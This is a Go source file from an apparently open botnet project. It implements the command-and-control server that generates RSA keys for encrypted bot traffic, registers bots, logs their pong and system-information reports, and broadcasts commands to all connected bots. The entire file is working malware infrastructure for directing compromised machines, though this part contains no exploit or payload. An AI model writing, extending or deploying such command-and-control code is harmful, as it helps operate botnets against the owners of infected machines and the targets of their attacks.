package ccserver

import (
	"crypto/rsa"

	"log"

	"github.com/adrianosela/botnet/command-and-control/ccworker"
	"github.com/adrianosela/botnet/lib/encryption"
	"github.com/adrianosela/botnet/lib/protocol"
)

// CommandAndControl is the command and control - controller
type CommandAndControl struct {
	msgDecryptKey *rsa.PrivateKey
	msgEncryptKey string
	bots          map[string]*ccworker.BotWorker
	// for inbound decrypted bot messages to be handled one-by-one
	recvMsgChan chan *protocol.Message
}

// NewCommandAndControl is the constructor for a CommandAndControl
func NewCommandAndControl() (*CommandAndControl, error) {
	log.Println("[cmd&ctrl] generating command and control public key...")
	priv, pub, err := encryption.GenerateRSAKeyPair(8192)
	if err != nil {
		return nil, err
	}
	log.Printf("[cmd&ctrl] command and control public key: \n%s", string(pub))
	cc := &CommandAndControl{
		msgDecryptKey: priv,
		msgEncryptKey: string(pub),
		bots:          make(map[string]*ccworker.BotWorker),
		recvMsgChan:   make(chan *protocol.Message),
	}
	go func() {
		for {
			select {
			case msg := <-cc.recvMsgChan:
				cc.HandleBotMessage(msg)
			}
		}
	}()
	return cc, nil
}

// HandleBotMessage handles a single given message
func (cc *CommandAndControl) HandleBotMessage(msg *protocol.Message) {
	switch msg.Type {
	case protocol.MessageTypePong:
		log.Printf("[bot %s] [[%s]] %v", msg.BotID, msg.Type, msg)
		return
	case protocol.MessageTypeSysInfo:
		log.Printf("[bot %s] [[%s]] %v", msg.BotID, msg.Type, msg)
	default:
		log.Printf("received message of unhandled type: %v", msg)
		return
	}
}

// BroadcastCommand broadcasts a command to all bots
func (cc *CommandAndControl) BroadcastCommand(cmd *protocol.Command) {
	log.Printf("[cmd&ctrl] broadcasting command to %d bots\n", len(cc.bots))
	for id := range cc.bots {
		if err := cc.bots[id].Send(cmd); err != nil {
			cc.ReleaseBot(id)
		}
	}
}

// ReleaseBot de registers a bot from a botnet
func (cc *CommandAndControl) ReleaseBot(id string) {
	if bot, ok := cc.bots[id]; ok {
		delete(cc.bots, id)
		bot.GracefulShutdown()
	}
	log.Printf("[cmd&ctrl] bot %s left net", id)
}
